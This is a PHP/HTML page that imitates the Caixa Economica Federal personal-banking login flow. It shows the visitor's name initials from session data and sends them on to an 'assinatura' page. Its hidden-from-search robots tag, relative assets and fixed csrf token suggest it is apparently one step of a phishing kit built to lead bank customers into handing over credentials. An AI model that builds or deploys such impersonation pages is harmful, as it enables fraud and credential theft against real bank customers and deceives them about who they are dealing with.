<?php
session_start();
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex, nofollow, noimageindex">
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    <title>Caixa Economica Federal - Autoatendimento Pessoa Fisica</title>
    <link rel="stylesheet" type="text/css" href="../assets/css/identificacao.css" />
    <link rel="icon" href="../assets/imgs/favicon.ico" type="image/x-icon" />
    <meta name="csrf-token" content="xxvap9tMfNDJBQEcQpXQNS9VkzSHgMwXkX5p7IIa" />

</head>

<body class="cadastro" cz-shortcut-listen="true">
    <div id="delimitarTeclado">
        <div class="main" id="conteudo">
            <div data-component="loading">
                <div class="modalBgLoading" style="display: none;">
                    <div class="loading"></div>
                </div>
            </div>

            <div class="container-fluid ajusteMargem">
                <div class="row" id="conteudo-login">
                    <div class="col-lg-9 col-md-9 col-sm-12 col-xs-12">
                        <div class="icoIdentificacaoUsuario iconLogin">
                            <span class="tituloPrincipal" style="margin-top: 0">Identificação do usuário</span>
                        </div>
                        <div class="panel panel-default inputCinza blocLoginCinza">
                            <div class="panel-body painelCinza blocLoginCinza">
                                <p id="titulo" class="fonteXS">AS INICIAIS DO SEU NOME SÃO:</p>
                                <div class="form-group text-center">
                                    <button type="button" id="lnkInitials" class="iniciaisNomeUsuario" style="border-radius: 3px;">
                                        <span class="textHiddenDV">Prezado Cliente, clique nas letras exibidas, se
                                            elas estiverem de acordo com as iniciais do seu nome. Caso contrário,
                                            clique em Voltar e reinicie sua identificação.</span>
                                        <?php if (empty($_SESSION['iniciais'])) {
                                        } else {
                                            echo ($_SESSION['iniciais']);
                                        } ?> *

                                    </button>
                                </div>

                                <p id="descricao" class="textoDestaque">Prezado Cliente, clique nas letras exibidas,
                                    se elas estiverem de acordo com as iniciais do seu nome. Caso contrário, clique
                                    em Voltar e reinicie sua identificação.</p>

                                <p id="complemento" class="textoDestaque">*Este dado está de acordo com o registro
                                    de Cadastro de Pessoa Física da Receita Federal.</p>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="row">
                    <div class="col-md-12 col-xs-12 form-group">
                        <button type="button" id="btnVoltar" name="btnVoltar" class="botaoCinza" title="Voltar" style="border-radius: 3px;">VOLTAR</button>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.5.1.js"></script>
    <script>
        $(document).ready(function() {
            $(document).on('click', '.iniciaisNomeUsuario', function() {
                location.href = "assinatura";
            });
        });
    </script>
</body>

</html>